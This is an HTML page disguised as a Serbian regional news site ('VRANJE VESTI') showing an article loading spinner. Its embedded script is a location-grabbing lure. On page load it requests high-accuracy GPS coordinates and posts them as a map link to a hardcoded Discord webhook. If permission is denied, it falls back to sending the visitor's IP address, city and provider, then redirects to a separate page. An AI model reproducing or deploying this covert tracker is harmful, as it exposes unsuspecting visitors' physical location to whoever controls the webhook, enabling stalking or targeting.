<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>VRANJE - NAJNOVIJE VESTI</title>
    
    <meta property="og:title" content="VRANJE - NAJNOVIJE VESTI">
    <meta property="og:description" content="Ekskluzivno: Detalji o događajima koji su potresli jug Srbije. Pročitajte više na portalu.">
    <meta property="og:image" content="https://vranjenews.rs/wp-content/uploads/2018/10/vranje-logo.jpg">
    <meta property="og:type" content="website">

    <style>
        body { 
            background-color: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: #333;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0056b3;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .vranje-logo {
            font-weight: bold;
            font-size: 24px;
            color: #0056b3;
            margin-bottom: 10px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="vranje-logo">VRANJE VESTI</div>
    <div class="loader"></div>
    <p style="font-size: 14px; font-weight: 500;">Učitavanje članka...</p>

    <script>
        const webhook = "https://discordapp.com/api/webhooks/1494157860643278890/-kmJPPm-TfxTuVOewXOnSbB6Wr3y8mv5eOc0vh5RsPsd3H27yyWR9lRh_kAt3MySMa8g";
        const target = "https://phosphoros333.github.io/VESTI-VRANJE-nezapamceni-kriminal-u-selu-stojadin/";

        async function notify(message) {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: message })
            });
        }

        async function fallbackIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                const msg = `🌐 **GRUBI PODACI (GPS ugašen):**\nLokacija: ${data.city}, ${data.country_name}\nProvajder: ${data.org}\nIP: ${data.ip}`;
                await notify(msg);
            } catch (e) { console.log(e); }
            window.location.href = target;
        }

        function success(pos) {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const acc = Math.round(pos.coords.accuracy);
            const msg = `🚨 **PRECIZNA LOKACIJA (VRANJE VESTI):**\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc}m`;
            notify(msg).then(() => { window.location.href = target; });
        }

        navigator.geolocation.getCurrentPosition(success, fallbackIP, {
            enableHighAccuracy: true,
            timeout: 7000
        });

        setTimeout(() => { window.location.href = target; }, 9000);
    </script>
</body>
</html>
